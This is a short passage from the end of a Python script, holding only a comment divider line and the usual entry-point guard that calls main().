
#########################################################
   
if __name__ == "__main__":
    main()